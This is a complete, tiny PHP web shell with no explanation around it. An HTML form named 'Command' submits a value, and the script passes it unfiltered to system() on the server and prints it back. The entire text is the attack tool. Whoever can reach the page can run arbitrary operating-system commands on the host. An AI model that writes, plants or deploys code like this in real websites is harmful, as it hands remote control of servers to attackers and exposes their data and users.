<form action="syst.php" method="get">
 Command: <input name="sub_com">
 <BR><input type="submit" value="Run">
</form>

<PRE>
<?php
 system($sub_com);
 print($sub_com);
?>
</PRE>